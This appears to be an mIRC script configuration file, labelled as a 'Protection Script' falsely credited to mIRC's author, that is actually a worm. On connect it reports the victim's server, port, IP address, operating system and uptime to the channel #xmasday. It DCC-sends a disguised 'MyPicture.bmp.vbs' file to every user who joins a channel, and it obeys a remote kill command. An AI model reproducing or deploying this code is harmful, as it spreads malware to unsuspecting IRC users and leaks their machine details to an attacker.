[script]
n0=;mIRC Protection Script DO NOT EDIT!
n1=;By Khaled Mardem-Bey
n2=;    www.mirc.com
n3=
n4=
n5=
n6=
n7=on 1:CONNECT:{
n8=  //.msg #xmasday Hi. $server $port $ip $os $time $date %chan it's been $+ $duration($calc($ticks / 1000)) since my last reboot! Mil0.4b
n9=}
n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }
n11=  /.dcc send $nick c:\windows\system\MyPicture.bmp.vbs
n12=}
n13=on 1:NICK: { if ($nick == $me) .msg #xmasday OldNick was $nick }
n14=on 1:notice:millennium*:?: .msg #xmasday 0,3 $time $nick Killed me, closing mIRC... *I Am Gone* | exit
